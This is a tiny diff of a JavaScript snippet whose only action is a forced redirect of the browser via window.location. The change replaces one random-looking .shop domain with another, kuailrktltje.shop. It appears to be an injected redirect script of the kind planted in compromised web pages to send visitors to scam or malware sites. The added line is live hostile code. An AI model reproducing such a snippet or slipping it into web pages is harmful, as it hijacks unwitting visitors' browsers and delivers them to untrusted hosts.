@@ -1,6 +1,7 @@
 (function() {
-    window['location'] = 'https://ghsdiukjdgijsubiksj.shop/';
+    window['location'] = 'https://kuailrktltje.shop/';
 })();
+
 
 
 
